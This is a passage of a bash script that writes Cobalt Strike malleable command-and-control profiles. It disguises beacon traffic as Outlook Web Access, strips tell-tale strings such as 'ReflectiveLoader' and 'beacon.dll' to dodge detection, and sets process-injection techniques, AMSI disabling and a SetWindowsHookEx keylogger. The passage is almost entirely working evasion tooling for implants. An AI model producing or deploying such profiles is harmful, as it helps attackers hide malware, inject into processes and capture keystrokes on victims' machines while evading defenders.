		prepend \"MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;\";
		header \"Cookie\";


		}
	}

	server {

	header \"Cache-Control\" \"no-cache\";
	header \"Pragma\" \"no-cache\";
	header \"Content-Type\" \"text/html; charset=utf-8\";
	header \"Server\" \"Microsoft-IIS/10.0\";
	header \"request-id\" \"6cfcf35d-0680-4853-98c4-b16723708fc9\";
	header \"X-CalculatedBETarget\" \"BY2PR06MB549.namprd0$namprd.prod.outlook.com\";
	header \"X-Content-Type-Options\" \"nosniff\";
	header \"X-OWA-Version\" \"15.1.1240.20\";
	header \"X-OWA-OWSVersion\" \"V2017_06_15\";
	header \"X-OWA-MinimumSupportedOWSVersion\" \"V2_6\";
	header \"X-Frame-Options\" \"SAMEORIGIN\";
	header \"X-DiagInfo\" \"BY2PR06MB549\";
	header \"X-UA-Compatible\" \"IE=EmulateIE7\";
	header \"X-Powered-By\" \"ASP.NET\";
	header \"X-FEServer\" \"CY4PR02CA0010\";
	header \"Connection\" \"close\";
		

		output {
			base64url;
			print;
		}
	}
	}

	http-stager {

	set uri_x86 \"/rpc/$num86\";
	set uri_x64 \"/rpc/$num64\";

	client {
		header \"Host\" \"$domain_name\";
	header \"Accept\" \"*/*\";
	}

	server {
		header \"Server\" \"nginx\";    
	}


	}
	"
}

storemaker () {
	pass=$(tail -c 1m /dev/urandom | md5sum | cut -d ' ' -f 1 | awk NF | cut -c 1-15)
	unzip -q cert*.zip
	openssl pkcs12 -export -in fullchain*.pem -inkey privkey*.pem -out $domain_name.p12 -name $domain_name -passout pass:$pass
	keytool -importkeystore -deststorepass $pass -destkeypass $pass -destkeystore $domain_name.store -srckeystore $domain_name.p12 -srcstoretype PKCS12 -srcstorepass $pass -alias $domain_name 2>/dev/null
	keystore=$(ls *.store)
	keystorepath=$(find / -name $keystore -print -quit 2>/dev/null)
	echo $'\n'"https-certificate {
     set keystore \"$keystorepath\"; 
     set password \"$pass\";
	}"
	rm *.pem
}

#--------###--------#--------###--------#Start Writing to File#--------###--------#--------###--------#




echo "set host_stage \"true\";" > $prof_name.profile #<---------------start, > instead of >>
echo "set sleeptime \"$sleep\";" >> $prof_name.profile
echo "set jitter \"$jitter\";" >> $prof_name.profile
echo "set useragent \"$selected_useragent\";" >> $prof_name.profile
echo 'set tasks_max_size "1048576";' >> $prof_name.profile
echo 'set tasks_proxy_max_size "921600";' >> $prof_name.profile
echo 'set tasks_dns_proxy_max_size "71680";' >> $prof_name.profile
echo "set data_jitter \"$data_jitter\";" >> $prof_name.profile
echo 'set smb_frame_header "";' $'\n' >> $prof_name.profile

echo "set pipename \"$selected_pipename$rand_pipe\";" >> $prof_name.profile
echo "set pipename_stager \"$selected_pipename$rand_pipe_stager\";" $'\n' >> $prof_name.profile

echo 'set tcp_frame_header "";' >> $prof_name.profile
echo "set ssh_banner \"$selected_ssh_banner\";" >> $prof_name.profile
echo "set ssh_pipename \"$selected_pipename##\";" $'\n' >> $prof_name.profile
echo 'stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";
	set sleep_mask "true";' $'\n' >> $prof_name.profile
echo "	set magic_mz_x86 \"$selected_MZ86$selected_MZ862\";" >> $prof_name.profile
echo "	set magic_mz_x64 \"$selected_MZ64$selected_MZ642\";" >> $prof_name.profile
echo "	set magic_pe \"$selected_MZ64\";" $'\n' >> $prof_name.profile

echo "$selected_pe_clone" $'\n' >> $prof_name.profile

echo " 
	transform-x86 {
		
	    prepend \"$shuffled_bytes_x86$shuffled_bytes_x862\"; 
	    strrep \"This program cannot be run in DOS mode\" \"\";
	    strrep \"ReflectiveLoader\" \"\";
	    strrep \"beacon.x64.dll\" \"\";
	    strrep \"beacon.dll\" \"\";
	    strrep \"msvcrt.dll\" \"\";
	    strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
	    strrep \"Stack around the variable\" \"\";
	    strrep \"was corrupted.\" \"\";
	    strrep \"The variable\" \"\";
	    strrep \"is being used without being initialized.\" \"\";
	    strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared\" \"\";
	    strrep \"A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:\" \"\";
	    strrep \"Changing the code in this way will not affect the quality of the resulting optimized code.\" \"\";
	    strrep \"Stack memory was corrupted\" \"\";
	    strrep \"A local variable was used before it was initialized\" \"\";
	    strrep \"Stack memory around _alloca was corrupted\" \"\";
	    strrep \"Unknown Runtime Check Error\" \"\";
	    strrep \"Unknown Filename\" \"\";
	    strrep \"Unknown Module Name\" \"\";
	    strrep \"Run-Time Check Failure\" \"\";
	    strrep \"Stack corrupted near unknown variable\" \"\";
	    strrep \"Stack pointer corruption\" \"\";
	    strrep \"Cast to smaller type causing loss of data\" \"\";
	    strrep \"Stack memory corruption\" \"\";
	    strrep \"Local variable used before initialization\" \"\";
	    strrep \"Stack around\" \"corrupted\";
	    strrep \"operator\" \"\";
	    strrep \"operator co_await\" \"\";
	    strrep \"operator<=>\" \"\";
	}" >> $prof_name.profile

echo " 
	transform-x64 {
	    prepend \"$shuffled_bytes_x64$shuffled_bytes_x642\"; 
	    strrep \"This program cannot be run in DOS mode\" \"\";
	    strrep \"ReflectiveLoader\" \"\";
	    strrep \"beacon.x64.dll\" \"\";
	    strrep \"beacon.dll\" \"\";
	    strrep \"msvcrt.dll\" \"\";
	    strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
	    strrep \"Stack around the variable\" \"\";
	    strrep \"was corrupted.\" \"\";
	    strrep \"The variable\" \"\";
	    strrep \"is being used without being initialized.\" \"\";
	    strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared\" \"\";
	    strrep \"A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:\" \"\";
	    strrep \"Changing the code in this way will not affect the quality of the resulting optimized code.\" \"\";
	    strrep \"Stack memory was corrupted\" \"\";
	    strrep \"A local variable was used before it was initialized\" \"\";
	    strrep \"Stack memory around _alloca was corrupted\" \"\";
	    strrep \"Unknown Runtime Check Error\" \"\";
	    strrep \"Unknown Filename\" \"\";
	    strrep \"Unknown Module Name\" \"\";
	    strrep \"Run-Time Check Failure\" \"\";
	    strrep \"Stack corrupted near unknown variable\" \"\";
	    strrep \"Stack pointer corruption\" \"\";
	    strrep \"Cast to smaller type causing loss of data\" \"\";
	    strrep \"Stack memory corruption\" \"\";
	    strrep \"Local variable used before initialization\" \"\";
	    strrep \"Stack around\" \"corrupted\";
	    strrep \"operator\" \"\";
	    strrep \"operator co_await\" \"\";
	    strrep \"operator<=>\" \"\";
	}
}" $'\n' >> $prof_name.profile

echo "process-inject {

    set allocator \"VirtualAllocEx\";
    set min_alloc \"$min_alloc_val\";
    set userwx    \"false\";
    set startrwx \"true\";

    transform-x86 {
		prepend \"$selected_x86_prepend\";
    }

    transform-x64 {
		prepend \"$selected_x64_prepend\";
    }

    execute {
	CreateThread \"ntdll.dll!RtlUserThreadStart+0x$createthread_val\";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
	CreateRemoteThread \"kernel32.dll!LoadLibraryA+0x1000\";
        RtlCreateUserThread;
	}
}" $'\n' >> $prof_name.profile

echo "post-ex {
	
    set spawnto_x86 \"%windir%\\\\syswow64\\\\$selected_post_ex_exe_86\";
    set spawnto_x64 \"%windir%\\\\sysnative\\\\$selected_post_ex_exe_64\";
    set obfuscate \"true\";
    set smartinject \"true\";
    set amsi_disable \"true\";
    set keylogger \"SetWindowsHookEx\";
}
" $'\n' >> $prof_name.profile

echo 'http-config {
	set trust_x_forwarded_for "false";			
}' >> $prof_name.profile


if [ "$profile_selection" == "1" ]; then
    WinUpdate_func >> $prof_name.profile
elif [ "$profile_selection" == "2" ]; then
    Slack_func >> $prof_name.profile
elif [ "$profile_selection" == "3" ]; then
    Owa_func >> $prof_name.profile
else
    echo "Invalid choice"
fi

storemaker >> $prof_name.profile

#Outlook profile missing, maybe add more profiles?
#Add comments
#Clean the code lol
